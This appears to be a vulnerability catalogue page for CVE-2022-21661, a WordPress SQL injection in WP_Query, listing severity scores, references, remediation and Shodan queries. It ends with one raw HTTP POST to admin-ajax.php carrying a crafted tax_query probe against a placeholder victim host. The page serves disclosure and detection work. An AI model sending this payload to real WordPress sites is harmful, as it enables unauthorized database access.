---
layout: "post"
cve_id: "CVE-2022-21661"
title: "WordPress <5.8.3 - SQL Injection"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-21661.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-21661.yaml"
author: "Marcio Mendes"
severity: "high"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary SQL queries, potentially leading to unauthorized access, data manipulation, or data leakage.
"
remediation: "This has been patched in 5.8.3. Older affected versions are also fixed via security release, that go back till 3.7.37. We strongly recommend that you keep auto-updates enabled. There are no known workarounds for this vulnerability."
reference:
  - "https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317"
  - "https://www.zerodayinitiative.com/blog/2022/1/18/cve-2021-21661-exposing-database-info-via-wordpress-sql-injection"
  - "http://packetstormsecurity.com/files/165540/WordPress-Core-5.8.2-SQL-Injection.html"
  - "https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84"
  - "https://nvd.nist.gov/vuln/detail/cve-2022-21661"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 7.5, 'cve-id': 'CVE-2022-21661', 'cwe-id': 'CWE-89', 'epss-score': 0.90904, 'epss-percentile': 0.9961, 'cpe': 'cpe:2.3:a:wordpress:wordpress:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'wordpress', 'product': 'wordpress', 'shodan-query': ['cpe:"cpe:2.3:a:wordpress:wordpress"', 'http.component:"wordpress"']}"
tags:
  - "cve2022"
  - "cve"
  - "wp"
  - "sqli"
  - "wpquery"
  - "wpscan"
  - "packetstorm"
  - "wordpress"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
WordPress before 5.8.3 is susceptible to SQL injection through multiple plugins or themes due to improper sanitization in WP_Query, An attacker can potentially obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Connection: close
Content-Length: 183
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=ecsload&query={"tax_query":{"0":{"field":"term_taxonomy_id","terms":[""]}}}&ecs_ajax_settings={"post_id":"1", "current_page":1, "widget_id":1, "theme_id":1, "max_num_pages":10}
```

